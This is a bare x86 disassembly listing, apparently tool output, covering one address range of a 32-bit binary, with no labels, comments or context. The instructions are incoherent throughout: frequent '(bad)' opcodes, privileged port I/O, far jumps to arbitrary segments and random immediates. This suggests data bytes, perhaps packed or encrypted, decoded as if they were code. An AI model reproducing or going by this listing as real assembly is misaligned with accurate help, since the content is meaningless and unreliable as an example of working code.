  40c007:	mov    BYTE PTR [esi-0x6627539a],bl
  40c00d:	popf   
  40c00e:	data16 daa 
  40c010:	cmp    DWORD PTR [edx+0x3e26f99c],esp
  40c016:	dec    edx
  40c017:	test   BYTE PTR [ebx+ebp*2-0x2e979a1c],dl
  40c01e:	sbb    edi,DWORD PTR [esp+esi*2]
  40c021:	push   0x2520d6b6
  40c026:	inc    esi
  40c027:	and    al,0x7b
  40c029:	repnz adc cl,bl
  40c02c:	cdq    
  40c02d:	push   0x4939f49c
  40c032:	jnp    0x40bfb9
  40c034:	jl     0x40c05c
  40c036:	fiadd  WORD PTR [esi+0x9]
  40c039:	pop    ecx
  40c03a:	in     al,dx
  40c03b:	sbb    ebx,DWORD PTR [ebx-0x2c]
  40c03e:	sub    eax,0xb440dec0
  40c043:	xor    al,0x1a
  40c045:	inc    edi
  40c046:	test   DWORD PTR [edx+eiz*8+0x2e],ebx
  40c04a:	test   cl,cl
  40c04c:	out    dx,al
  40c04d:	scas   eax,DWORD PTR es:[edi]
  40c04e:	bound  edi,QWORD PTR [ebp+0x68]
  40c051:	mov    esi,0xfe998de8
  40c056:	dec    ecx
  40c057:	xor    eax,0xdb3d5c66
  40c05c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c05d:	xlat   BYTE PTR ds:[ebx]
  40c05e:	pop    ebx
  40c05f:	pop    es
  40c060:	pop    es
  40c061:	xchg   DWORD PTR [ebp-0x5d],eax
  40c064:	push   ds
  40c065:	mov    ah,0x69
  40c067:	xchg   esi,eax
  40c068:	sub    eax,0xd4ecb4b3
  40c06d:	fimul  WORD PTR ds:0x76999bef
  40c073:	mov    edx,DWORD PTR [esi]
  40c075:	adc    ecx,DWORD PTR ds:0x9993410a
  40c07b:	or     DWORD PTR [ebp-0x6988ed22],ecx
  40c081:	sub    BYTE PTR [edx+0x46d6ab9e],al
  40c087:	(bad)  
  40c089:	push   bp
  40c08b:	dec    ecx
  40c08c:	(bad)  
  40c08e:	sbb    al,0x29
  40c090:	dec    eax
  40c091:	cmp    DWORD PTR [esi+ebp*8],0xffffffbf
  40c095:	int3   
  40c096:	(bad)  
  40c098:	xchg   esp,eax
  40c099:	xchg   edx,eax
  40c09a:	div    DWORD PTR [ebp-0xe]
  40c09d:	sub    al,0xda
  40c09f:	jnp    0x40c02a
  40c0a1:	imul   esi,DWORD PTR [ebx],0xb1e08373
  40c0a7:	enter  0x49fd,0xfe
  40c0ab:	out    0x14,eax
  40c0ad:	jno    0x40c0ff
  40c0af:	ds adc al,0x2d
  40c0b2:	nop
  40c0b3:	mov    ch,ch
  40c0b5:	scas   eax,DWORD PTR es:[edi]
  40c0b6:	dec    edi
  40c0b7:	int3   
  40c0b8:	sbb    BYTE PTR [ebx+0x367881f9],dl
  40c0be:	test   eax,0xd451e997
  40c0c3:	test   eax,0x4148be2e
  40c0c8:	adc    esp,DWORD PTR [edx*1-0x5939ffd0]
  40c0cf:	in     al,dx
  40c0d0:	or     eax,0x59e94ca3
  40c0d5:	push   eax
  40c0d6:	xchg   ecx,eax
  40c0d7:	adc    ebp,DWORD PTR ds:0x253260bd
  40c0dd:	sbb    al,0x56
  40c0df:	bound  eax,QWORD PTR [ebx-0x5c]
  40c0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e3:	repz stc 
  40c0e5:	and    bl,dl
  40c0e7:	mov    DWORD PTR [edx-0x2f],ebx
  40c0ea:	nop
  40c0eb:	sbb    al,0xc5
  40c0ed:	cmp    ch,cl
  40c0ef:	xchg   edi,eax
  40c0f0:	jbe    0x40c140
  40c0f2:	gs int3 
  40c0f4:	mov    ?,WORD PTR [edx+eiz*4+0x72]
  40c0f8:	push   edi
  40c0f9:	dec    edx
  40c0fa:	arpl   WORD PTR [esi],ax
  40c0fc:	push   0x47
  40c0fe:	into   
  40c0ff:	pop    edi
  40c100:	inc    esp
  40c101:	mov    dl,0x5f
  40c103:	sub    edi,DWORD PTR [eax]
  40c105:	lds    edi,FWORD PTR [edi+0x2f]
  40c108:	(bad)  
  40c109:	lock out 0x4f,al
  40c10c:	fcomp  QWORD PTR [edi+0x7233795c]
  40c112:	aam    0xbd
  40c114:	ins    DWORD PTR es:[edi],dx
  40c115:	mov    ecx,0xbc43e3f5
  40c11a:	inc    esp
  40c11b:	jge    0x40c0ad
  40c11d:	mov    dh,0x19
  40c11f:	cmp    BYTE PTR [edx+0x6f50f8c3],0x3a
  40c126:	and    eax,0x45d9e1db
  40c12b:	fmul   QWORD PTR [eax]
  40c12d:	cmp    bh,bl
  40c12f:	sar    BYTE PTR [esi-0x6c1e9bde],cl
  40c135:	add    esi,DWORD PTR [edx-0x45]
  40c138:	mov    al,0xff
  40c13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c13b:	adc    BYTE PTR [ecx-0x4ec0ab84],bh
  40c141:	aas    
  40c142:	fstp   QWORD PTR [esi-0x7e9afdba]
  40c148:	mov    ds:0x1e6ffc6f,al
  40c14d:	sub    al,0xdb
  40c14f:	xchg   edx,eax
  40c150:	std    
  40c151:	ins    DWORD PTR es:[edi],dx
  40c152:	cmp    cl,dl
  40c154:	lods   al,BYTE PTR ds:[esi]
  40c155:	ret    
  40c156:	out    dx,eax
  40c157:	mov    edi,0x11c1e615
  40c15c:	call   FWORD PTR [edi+0x2c2176d8]
  40c162:	xor    al,0x38
  40c164:	fbstp  TBYTE PTR [ecx-0x457a2be5]
  40c16a:	hlt    
  40c16b:	bound  ecx,QWORD PTR [edi+0x97dde13]
  40c171:	mov    bh,0x9f
  40c173:	ja     0x40c13a
  40c175:	or     al,0x6c
  40c177:	aas    
  40c178:	dec    esp
  40c179:	adc    DWORD PTR [esi-0x72302b5c],edi
  40c17f:	loopne 0x40c1bf
  40c181:	daa    
  40c182:	fwait
  40c183:	pop    esi
  40c184:	out    0x63,eax
  40c186:	lock imul bh
  40c189:	icebp  
  40c18a:	es shl esp,0xd6
  40c18e:	mov    ds:0xad6956e6,eax
  40c193:	mov    cl,0x78
  40c195:	ss jmp 0xacaa:0x2a840e20
  40c19d:	fst    QWORD PTR [edx]
  40c19f:	in     al,0x49
  40c1a1:	sub    al,BYTE PTR [edx]
  40c1a3:	out    dx,al
  40c1a4:	call   0xf5fc:0xd1e0f91
  40c1ab:	jecxz  0x40c1f8
  40c1ad:	(bad)  
  40c1ae:	mov    cl,0x3c
  40c1b0:	add    al,0x73
  40c1b2:	out    0x92,eax
  40c1b4:	adc    BYTE PTR [edi+0x13],0x2d
  40c1b8:	fadd   st,st(3)
  40c1ba:	ret    
  40c1bb:	jle    0x40c170
  40c1bd:	pop    ebp
  40c1be:	sub    eax,0xbb1e35ff
  40c1c3:	xchg   esi,eax
  40c1c4:	mov    dl,dh
  40c1c6:	jmp    0x8516:0x5c469ed3
  40c1cd:	jbe    0x40c1da
  40c1cf:	movaps xmm5,xmm5
  40c1d2:	xor    dh,bl
  40c1d4:	lods   al,BYTE PTR ds:[esi]
  40c1d5:	mov    edx,DWORD PTR ds:0x77a83259
  40c1db:	test   eax,0x3333ab2c
  40c1e0:	rcr    DWORD PTR [edi-0x26],1
  40c1e3:	mov    ecx,0x2758addd
  40c1e8:	bound  ebp,QWORD PTR [ecx]
  40c1ea:	cmc    
  40c1eb:	test   DWORD PTR [ebx],ecx
  40c1ed:	outs   dx,BYTE PTR ds:[esi]
  40c1ee:	cwde   
  40c1ef:	loope  0x40c206
  40c1f1:	loop   0x40c18c
  40c1f3:	and    al,0x60
  40c1f5:	outs   dx,BYTE PTR ds:[esi]
  40c1f6:	sti    
  40c1f7:	push   ebp
  40c1f8:	dec    ecx
  40c1f9:	sti    
  40c1fa:	outs   dx,DWORD PTR ds:[esi]
  40c1fb:	mul    DWORD PTR [esi-0x403ccba8]
  40c201:	pop    ds
  40c202:	push   cs
  40c203:	fwait
  40c204:	test   dh,ah
  40c206:	les    edx,FWORD PTR [eax]
  40c208:	das    
  40c209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c20a:	iret   
  40c20b:	imul   ebp,DWORD PTR ds:0xdae0edd0,0xffffffa2
  40c212:	rcr    DWORD PTR [ebx*8-0x7033e09d],1
  40c219:	pusha  
  40c21a:	jb     0x40c20f
  40c21c:	pop    ebp
  40c21d:	inc    esp
  40c21e:	pusha  
  40c21f:	xor    eax,0x861b440e
  40c224:	mov    bh,0xd8
  40c226:	arpl   dx,sp
  40c228:	(bad)  
  40c22a:	shl    DWORD PTR [ecx+0x2f],1
  40c22d:	repnz aas 
  40c22f:	add    esi,DWORD PTR [ecx]
  40c231:	xor    bl,BYTE PTR [edi-0x49]
  40c234:	rcl    BYTE PTR [eax+0x368cba86],1
  40c23a:	push   edi
  40c23b:	adc    al,BYTE PTR [edx-0x36]
  40c23e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c23f:	or     BYTE PTR [esi-0x16],0x2c
  40c243:	nop
  40c244:	cmp    DWORD PTR [esi],eax
  40c246:	cdq    
  40c247:	push   0x7d
  40c249:	fwait
  40c24a:	cwde   
  40c24b:	idiv   BYTE PTR [edx-0x46]
  40c24e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24f:	pusha  
  40c250:	cmc    
  40c251:	mov    al,ds:0xad8bb45b
  40c256:	mov    edx,0x77433eac
  40c25b:	icebp  
  40c25c:	xchg   ebp,eax
  40c25d:	xlat   BYTE PTR ds:[ebx]
  40c25e:	and    DWORD PTR [edi-0x1d],ebp
  40c261:	mov    al,0x10
  40c263:	sbb    BYTE PTR [eax-0x5976c5d2],bl
  40c269:	cwde   
  40c26a:	inc    ebp
  40c26b:	cwde   
  40c26c:	jmp    0x8007:0x135f96df
  40c273:	test   ebx,edi
  40c275:	mov    esi,0x5b0852f7
  40c27a:	stos   DWORD PTR es:[edi],eax
  40c27b:	stos   BYTE PTR es:[edi],al
  40c27c:	aas    
  40c27d:	cmc    
  40c27e:	dec    ecx
  40c27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c280:	js     0x40c202
  40c282:	int3   
  40c283:	xor    DWORD PTR [edx+0x5670a2d6],ebx
  40c289:	sub    BYTE PTR [ecx+edx*1],dh
  40c28c:	jno    0x40c262
  40c28e:	retf   
  40c28f:	lea    edi,[ecx]
  40c291:	mov    ebx,0xec0f32a8
  40c296:	mov    edx,ecx
  40c298:	xchg   BYTE PTR [eax+0x29b187a4],al
  40c29e:	push   cs
  40c29f:	add    DWORD PTR [ebx+eiz*1-0x4d],eax
  40c2a3:	pop    ecx
  40c2a4:	aad    0x8d
  40c2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a7:	xchg   ecx,eax
  40c2a8:	push   edx
  40c2a9:	sub    edi,DWORD PTR [ebx]
  40c2ab:	loope  0x40c323
  40c2ad:	fsub   st,st(4)
  40c2af:	call   0x753a:0xccead4ea
  40c2b6:	jle    0x40c2e3
  40c2b8:	into   
  40c2b9:	ss fwait
  40c2bb:	rcr    edx,cl
  40c2bd:	jge    0x40c2f2
  40c2bf:	inc    ebp
  40c2c0:	test   ebp,ebx
  40c2c2:	(bad)  
  40c2c3:	push   ss
  40c2c4:	and    DWORD PTR [esi+0x39],0xffffffe8
  40c2c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2c9:	es push edx
  40c2cb:	jmp    0x40c28e
  40c2cd:	out    dx,al
  40c2ce:	stc    
  40c2cf:	leave  
  40c2d0:	imul   eax,ebx,0x70
  40c2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2d4:	ins    DWORD PTR es:[edi],dx
  40c2d5:	mov    ds:0xd1ca38f2,eax
  40c2da:	iret   
  40c2db:	rcr    BYTE PTR [edx-0x3c],cl
  40c2de:	aaa    
  40c2df:	add    eax,0x546a361d
  40c2e4:	adc    eax,DWORD PTR [eax-0x7b]
  40c2e7:	pop    DWORD PTR [edx+0x48]
  40c2ea:	sub    BYTE PTR [ecx],ah
  40c2ec:	xchg   ecx,eax
  40c2ed:	mov    eax,0xf3d4c9e6
  40c2f2:	enter  0x8868,0x8b
  40c2f6:	popf   
  40c2f7:	loopne 0x40c348
  40c2f9:	pop    es
  40c2fa:	jmp    0xcff6:0x96a3ca93
  40c301:	bound  eax,QWORD PTR [edi-0x1e]
  40c304:	push   es
  40c305:	out    0x2a,al
  40c307:	jp     0x40c320
  40c309:	pop    edi
  40c30a:	add    ecx,DWORD PTR [esi]
  40c30c:	pop    eax
  40c30d:	stos   DWORD PTR es:[edi],eax
  40c30e:	pushf  
  40c30f:	add    bh,BYTE PTR [ecx+0x7f]
  40c312:	mov    edx,edi
  40c314:	rol    DWORD PTR [edi],cl
  40c316:	int3   
  40c317:	push   ebx
  40c318:	pop    esp
  40c319:	jle    0x40c35e
  40c31b:	jmp    0xeeae:0x889b5a83
  40c322:	into   
  40c323:	mov    ebp,0x3eb7eee1
  40c328:	fstp   TBYTE PTR [ebp+0x6f]
  40c32b:	mov    edx,DWORD PTR [ecx]
  40c32d:	out    0x9a,al
  40c32f:	push   es
  40c330:	cmp    al,0xe5
  40c332:	mov    cl,0x5f
  40c334:	xor    bl,BYTE PTR [ebx+eax*1]
  40c337:	cwde   
  40c338:	mov    ah,0x30
  40c33a:	repnz adc BYTE PTR [eax+0x2191b270],dl
  40c341:	mov    esi,0xff873799
  40c346:	(bad)  
  40c347:	pop    ecx
  40c348:	retf   
  40c349:	mov    eax,0xf9ade608
  40c34e:	aad    0x75
  40c350:	push   0xc608633d
  40c355:	add    ecx,DWORD PTR [esi+0x5f]
  40c358:	push   edi
  40c359:	xor    eax,0x9c5aa80c
  40c35e:	sub    ebx,edx
  40c360:	mov    ch,0x9c
  40c362:	adc    esp,DWORD PTR [eax+ecx*1]
  40c365:	mov    ds:0xb47d8f70,eax
  40c36a:	jbe    0x40c34c
  40c36c:	cmp    BYTE PTR gs:[ebp+0x5b79a58b],ch
  40c373:	lods   al,BYTE PTR ds:[esi]
  40c374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c375:	mov    ecx,0xb12e42b4
  40c37a:	adc    cl,BYTE PTR [edi-0x78]
  40c37d:	sar    ch,cl
  40c37f:	int3   
  40c380:	or     ebx,esi
  40c382:	out    0xb0,al
  40c384:	add    esp,0x36
  40c387:	jmp    0x40c3ce
  40c389:	enter  0x6096,0x70
  40c38d:	loopne 0x40c39d
  40c38f:	mov    edx,es
  40c391:	xchg   ebp,eax
  40c392:	gs retf 
  40c394:	or     BYTE PTR [ecx],ah
  40c396:	(bad)  
  40c397:	out    dx,al
  40c398:	adc    esp,esp
  40c39a:	jp     0x40c3d3
  40c39c:	jl     0x40c335
  40c39e:	push   0xa6defb5e
  40c3a3:	and    cl,BYTE PTR [ecx-0x64a65983]
  40c3a9:	and    al,0xfc
  40c3ab:	and    dh,BYTE PTR [eax-0xd]
  40c3ae:	int    0xd2
  40c3b0:	xor    DWORD PTR [edx-0x33],eax
  40c3b3:	das    
  40c3b4:	outs   dx,BYTE PTR ds:[esi]
  40c3b5:	imul   eax,DWORD PTR [edx],0x3d
  40c3b8:	mov    ah,0x8f
  40c3ba:	sub    ebp,DWORD PTR [eax]
  40c3bc:	scas   al,BYTE PTR es:[edi]
  40c3bd:	cmp    BYTE PTR [esi-0x309043e5],bl
  40c3c3:	cmp    edi,DWORD PTR ds:0xdbddc85
  40c3c9:	bound  ecx,QWORD PTR [ecx-0x6d791e8d]
  40c3cf:	adc    al,0x92
  40c3d1:	ins    BYTE PTR es:[edi],dx
  40c3d2:	push   ecx
  40c3d3:	aam    0xd9
  40c3d5:	je     0x40c391
  40c3d7:	mov    ebx,0xe150786e
  40c3dc:	dec    ecx
  40c3dd:	cmc    
  40c3de:	ins    BYTE PTR es:[edi],dx
  40c3df:	retf   0x27be
  40c3e2:	jne    0x40c431
  40c3e4:	jmp    0x40c3e2
  40c3e6:	stc    
  40c3e7:	enter  0xbe29,0x97
  40c3eb:	in     eax,dx
  40c3ec:	lea    esp,ds:[edx]
  40c3ef:	and    eax,0x8b0241ef
  40c3f4:	jae    0x40c387
  40c3f6:	(bad)  
  40c3f7:	aaa    
  40c3f8:	pushf  
  40c3f9:	imul   bl
  40c3fb:	rol    DWORD PTR [ebx],0x39
  40c3fe:	cdq    
  40c3ff:	or     al,0xae
  40c401:	out    dx,al
  40c402:	fwait
  40c403:	in     eax,0xc0
  40c405:	shl    BYTE PTR [edi+0x757471a3],1
  40c40b:	and    ch,BYTE PTR [edi-0x28]
  40c40e:	popf   
  40c40f:	pop    edi
  40c410:	rcl    DWORD PTR [edi-0x6b],cl
  40c413:	push   edi
  40c414:	hlt    
  40c415:	scas   al,BYTE PTR es:[edi]
  40c416:	test   edx,edi
  40c418:	mov    dh,0x3a
  40c41a:	mov    dl,0x84
  40c41c:	xor    edi,ecx
  40c41e:	sbb    al,BYTE PTR [ebp-0x64]
  40c421:	bound  ebx,QWORD PTR [ebp+0x73]
  40c424:	cmp    DWORD PTR [ebp+0x1d],esp
  40c427:	sub    al,0xf5
  40c429:	mov    DWORD PTR [eax+0x54],ecx
  40c42c:	call   0x85508422
  40c431:	retf   
  40c432:	or     bl,BYTE PTR [esi]
  40c434:	pushf  
  40c435:	push   0x296ee3c6
  40c43a:	cwde   
  40c43b:	es push esi
  40c43d:	sbb    esi,DWORD PTR [edx+0x35ad4f3c]
  40c443:	test   DWORD PTR [eax-0x44],edi
  40c446:	cdq    
  40c447:	add    DWORD PTR [edx],0x7f
  40c44a:	dec    edx
  40c44b:	or     eax,0xe1c7945c
  40c450:	popf   
  40c451:	mov    ah,0xc2
  40c453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c454:	xor    ebp,DWORD PTR [eax-0x48]
  40c457:	test   eax,0x73c9cd2a
  40c45c:	loope  0x40c463
  40c45e:	mov    eax,0x1749b900
  40c463:	jne    0x40c4b5
  40c465:	push   ds
  40c466:	(bad)  
  40c467:	xchg   ebp,eax
  40c468:	das    
  40c469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c46a:	not    BYTE PTR [ecx+0x70a39532]
  40c470:	lock jmp 0xdd19:0xf9a92798
  40c478:	push   ss
  40c479:	jg     0x40c42d
  40c47b:	scas   eax,DWORD PTR es:[edi]
  40c47c:	shr    DWORD PTR [esi-0x25717c46],cl
  40c482:	ja     0x40c479
  40c484:	aad    0xfe
  40c486:	mov    DWORD PTR [edi],edi
  40c488:	mov    esp,0x917dd0e5
  40c48d:	(bad)  
  40c48e:	mov    dl,0x5
  40c490:	push   ecx
  40c491:	pop    edi
  40c492:	push   ebx
  40c493:	mov    ds:0xc77c6bfb,al
  40c498:	sti    
  40c499:	xchg   esp,eax
  40c49a:	dec    eax
  40c49b:	test   BYTE PTR [ecx+0x8],ah
  40c49e:	cld    
  40c49f:	xchg   esi,eax
  40c4a0:	pop    ecx
  40c4a1:	lds    edi,FWORD PTR [eax+edx*8-0x4f]
  40c4a5:	sub    dl,BYTE PTR gs:[eax]
  40c4a8:	pop    eax
  40c4a9:	in     eax,0x15
  40c4ab:	stc    
  40c4ac:	mov    ds:0xfea477e,eax
  40c4b1:	ss or  al,0x93
  40c4b4:	clc    
  40c4b5:	test   eax,0xa86202c3
  40c4ba:	fld    QWORD PTR [ecx-0x70]
  40c4bd:	test   BYTE PTR ds:0x56e7e989,cl
  40c4c3:	pop    ebp
  40c4c4:	sbb    bl,dh
  40c4c6:	xor    eax,0x3368f6
  40c4cb:	add    al,0xba
  40c4cd:	xchg   esp,ebx
  40c4cf:	in     al,0x79
  40c4d1:	push   0xffffff9c
  40c4d3:	outs   dx,BYTE PTR ds:[esi]
  40c4d4:	and    BYTE PTR [edx+0x2aff61a6],ah
  40c4da:	pusha  
  40c4db:	mov    dl,0x86
  40c4dd:	sub    DWORD PTR [eiz*2+0x480ab07f],0xffffffd8
  40c4e5:	or     BYTE PTR [edx+0x5b],dh
  40c4e8:	sbb    al,0x12
  40c4ea:	xor    ebx,DWORD PTR [ebx+0x45]
  40c4ed:	adc    al,ah
  40c4ef:	test   al,0x51
  40c4f1:	fmul   QWORD PTR [esi+0x17ba6d92]
  40c4f7:	jbe    0x40c529
  40c4f9:	ret    0x5fcf
  40c4fc:	pop    es
  40c4fd:	fmul   QWORD PTR [edi]
  40c4ff:	je     0x40c53b
  40c501:	inc    edx
  40c502:	and    al,0xbd
  40c504:	fstp   TBYTE PTR [ebp+0x78]
  40c507:	leave  
  40c508:	loope  0x40c56d
  40c50a:	(bad)  
  40c50b:	and    bl,bl
  40c50d:	jnp    0x40c53c
  40c50f:	and    ah,dh
  40c511:	test   al,0x5b
  40c513:	fmul   DWORD PTR [ecx+eax*8]
  40c516:	xchg   edi,eax
  40c517:	jg     0x40c4a8
  40c519:	mov    ecx,0x108c0761
  40c51e:	jae    0x40c4c1
  40c520:	inc    ebx
  40c521:	pop    ecx
  40c522:	add    ecx,DWORD PTR [ebp-0x2c04f3ff]
  40c528:	cmp    BYTE PTR [eax-0x3],cl
  40c52b:	sbb    ebx,DWORD PTR [ebx+0x7a]
  40c52e:	add    dl,BYTE PTR [esi-0x24]
  40c531:	enter  0x2531,0xd5
  40c535:	pop    esp
  40c536:	call   FWORD PTR [ecx+0x79]
  40c539:	add    eax,0x27623470
  40c53e:	repz mov edi,0xaf3a545d
  40c544:	nop
  40c545:	jnp    0x40c4f3
  40c547:	jmp    0x40c557
  40c549:	mov    esp,0xeeda4457
  40c54e:	xchg   esi,eax
  40c54f:	mov    edx,0x666a816d
  40c554:	(bad)  
  40c555:	jmp    0xed3a8265
  40c55a:	adc    DWORD PTR [edx+ebx*1],ecx
  40c55d:	sbb    dh,BYTE PTR [esp+ebx*2]
  40c560:	ins    BYTE PTR es:[edi],dx
  40c561:	jo     0x40c4f5
  40c563:	test   al,0xf4
  40c565:	repnz adc esp,ebx
  40c568:	daa    
  40c569:	cmp    ecx,DWORD PTR [edx+edi*8]
  40c56c:	sti    
  40c56d:	jbe    0x40c52a
  40c56f:	mov    WORD PTR ss:[edx],ss
  40c572:	sub    bh,BYTE PTR ds:0xaf152903
  40c578:	add    esi,ebx
  40c57a:	add    al,0xd8
  40c57c:	mov    al,0xcd
  40c57e:	pushf  
  40c57f:	pop    edi
  40c580:	push   ss
  40c581:	stos   BYTE PTR es:[edi],al
  40c582:	mov    bh,0x34
  40c584:	cmp    DWORD PTR [edi],ecx
  40c586:	pop    edi
  40c587:	cmc    
  40c588:	lea    ecx,[edx+0x7f1a8192]
  40c58e:	adc    eax,0x4733bcb1
  40c593:	xlat   BYTE PTR ds:[ebx]
  40c594:	outs   dx,BYTE PTR ds:[esi]
  40c595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c596:	xor    ebp,edx
  40c598:	icebp  
  40c599:	shl    BYTE PTR [ebp-0xa8043b7],cl
  40c59f:	dec    ebx
  40c5a0:	mov    edx,ebx
  40c5a2:	inc    ebx
  40c5a3:	sub    esp,ebp
  40c5a5:	in     al,0x7e
  40c5a7:	arpl   dx,ax
  40c5a9:	xlat   BYTE PTR ds:[ebx]
  40c5aa:	jg     0x40c576
  40c5ac:	jle    0x40c59f
  40c5ae:	pop    ecx
  40c5af:	mov    ah,0xaf
  40c5b1:	cmp    al,0x8d
  40c5b3:	adc    esi,DWORD PTR [esi+0x18]
  40c5b6:	js     0x40c631
  40c5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ba:	aam    0x84
  40c5bc:	cmp    dl,BYTE PTR [ebx]
  40c5be:	xor    al,0x7e
  40c5c0:	pusha  
  40c5c1:	das    
  40c5c2:	enter  0xdc0a,0xf9
  40c5c6:	ins    BYTE PTR es:[edi],dx
  40c5c7:	mov    bh,0xf3
  40c5c9:	dec    eax
  40c5ca:	xor    ecx,eax
  40c5cc:	cs sahf 
  40c5ce:	adc    al,0x23
  40c5d0:	call   0x73459b19
  40c5d5:	jo     0x40c5ed
  40c5d7:	xchg   edi,eax
  40c5d8:	mov    al,ds:0xa180139d
  40c5dd:	add    eax,0x68ca0674
  40c5e2:	(bad)  
  40c5e3:	pop    ecx
  40c5e4:	cli    
  40c5e5:	dec    ebp
  40c5e6:	mov    edx,0x62c669bc
  40c5eb:	shl    DWORD PTR [ecx+0x48],cl
  40c5ee:	mov    ebx,0xbaf71d84
  40c5f3:	mov    ah,0x95
  40c5f5:	es je  0x40c5a2
  40c5f8:	enter  0xe56c,0x93
  40c5fc:	jg     0x40c58d
  40c5fe:	mov    bl,0x55
  40c600:	lahf   
  40c601:	dec    edx
  40c602:	cmp    ebx,ebx
  40c604:	repz fcomip st,st(7)
  40c607:	xor    esi,DWORD PTR [edi]
  40c609:	(bad)  
  40c60a:	sar    BYTE PTR [ebx-0x78da67f2],cl
  40c610:	(bad)  
  40c611:	mov    ebp,DWORD PTR [esi+eiz*1-0x3d]
  40c615:	popa   
  40c616:	mov    eax,gs
  40c618:	pop    es
  40c619:	mov    eax,0xd3c85c6a
  40c61e:	pop    ds
  40c61f:	loope  0x40c5d5
  40c621:	mov    al,0x19
  40c623:	xor    eax,esp
  40c625:	adc    BYTE PTR [esi+0x59],bh
  40c628:	mov    ss,esp
  40c62a:	dec    edi
  40c62b:	iret   
  40c62c:	sar    DWORD PTR ds:0x10274e8f,cl
  40c632:	xor    BYTE PTR [ebx-0x70],dh
  40c635:	repz rcr BYTE PTR [edx+0x455d6d4e],1
  40c63c:	pusha  
  40c63d:	out    0xd,al
  40c63f:	(bad)
  40c642:	jge    0x40c6b5
  40c644:	push   0x36
  40c646:	nop
  40c647:	or     esp,ecx
  40c649:	pop    esp
  40c64a:	std    
  40c64b:	or     cl,BYTE PTR [edi-0x48]
  40c64e:	pushf  
  40c64f:	(bad)  
  40c650:	dec    ebx
  40c651:	stc    
  40c652:	ins    DWORD PTR es:[edi],dx
  40c653:	mov    ds:0xb1f767eb,al
  40c658:	mov    bl,0xc
  40c65a:	rcr    DWORD PTR [eax],cl
  40c65c:	cli    
  40c65d:	adc    edx,esp
  40c65f:	sbb    BYTE PTR [edx+0x8],al
  40c662:	mov    es,WORD PTR [ebp+0x3fc5ebd1]
  40c668:	push   edi
  40c669:	loop   0x40c63f
  40c66b:	(bad)  
  40c66c:	out    0xa1,al
  40c66e:	repnz mov edx,ebx
  40c671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c672:	mov    DWORD PTR ds:0x8a3b9e27,eax
  40c678:	add    edx,DWORD PTR [esi+0x18]
  40c67b:	jmp    0x9b59fbd6
  40c680:	sti    
  40c681:	push   ss
  40c682:	xchg   esi,eax
  40c683:	(bad)  
  40c684:	mov    cl,0x3
  40c686:	dec    edx
  40c687:	cmp    DWORD PTR [esi+0x29db7578],ecx
  40c68d:	test   BYTE PTR [esi-0x1d],dh
  40c690:	mov    edi,0xf91f5a66
  40c695:	pop    edx
  40c696:	lods   eax,DWORD PTR ds:[esi]
  40c697:	imul   ebx,edx,0x24db0927
  40c69d:	ss dec eax
  40c69f:	fdiv   QWORD PTR [edx+0x286a60f1]
  40c6a5:	push   ds
  40c6a6:	push   edi
  40c6a7:	pushf  
  40c6a8:	dec    ecx
  40c6a9:	mov    ebp,fs
  40c6ab:	adc    BYTE PTR [esi+0x7e],bh
  40c6ae:	ds pop ecx
  40c6b0:	fsubr  QWORD PTR [esi-0x693153f7]
  40c6b6:	push   0x5
  40c6b8:	ret    0xec2f
  40c6bb:	mov    bh,0x13
  40c6bd:	xor    DWORD PTR [ebx*4-0x4552b0a7],esp
  40c6c4:	lds    ecx,FWORD PTR [eax-0x22fc7ca7]
  40c6ca:	cmp    eax,0x41b65997
  40c6cf:	mov    WORD PTR [eax-0x4f],es
  40c6d2:	sub    eax,0xd246cc9f
  40c6d7:	inc    ecx
  40c6d8:	jmp    0x57ab:0xa9f9b9d
  40c6df:	fst    QWORD PTR [edi]
  40c6e1:	cli    
  40c6e2:	in     eax,0x76
  40c6e4:	pop    ecx
  40c6e5:	mov    gs,WORD PTR [edx]
  40c6e7:	mov    ebp,0x19e14ade
  40c6ec:	test   eax,0x9c6e165
  40c6f1:	or     al,0x6c
  40c6f3:	sub    esi,DWORD PTR [esi]
  40c6f5:	jmp    0x3c67c31
  40c6fa:	and    ch,BYTE PTR gs:[edi]
  40c6fd:	adc    BYTE PTR [ecx+0x30a2deb2],dl
  40c703:	stos   BYTE PTR es:[edi],al
  40c704:	in     al,0x8a
  40c706:	sub    al,0x84
  40c708:	pop    es
  40c709:	mov    cl,0x81
  40c70b:	popa   
  40c70c:	mov    eax,ds:0xd6aa1645
  40c711:	mov    eax,0x4c26d85d
  40c716:	sbb    al,0x2d
  40c718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c719:	xor    eax,0x15807101
  40c71e:	clc    
  40c71f:	out    dx,eax
  40c720:	add    al,0xe8
  40c722:	(bad)  
  40c723:	xchg   esi,eax
  40c724:	cli    
  40c725:	cmp    ah,BYTE PTR [ecx]
  40c727:	sti    
  40c728:	push   eax
  40c729:	loop   0x40c79b
  40c72b:	and    BYTE PTR [edx],dl
  40c72d:	stc    
  40c72e:	and    dh,BYTE PTR [ebx+0x56]
  40c731:	push   0xffffffa1
  40c733:	pop    edi
  40c734:	mov    eax,0x1ba080d
  40c739:	nop
  40c73a:	shl    edx,0x6b
  40c73d:	mov    edi,0xcd00bdf5
  40c742:	repnz retf 0x31
  40c746:	pop    edx
  40c747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c748:	in     al,dx
  40c749:	xchg   edx,eax
  40c74a:	push   ds
  40c74b:	cdq    
  40c74c:	dec    ebp
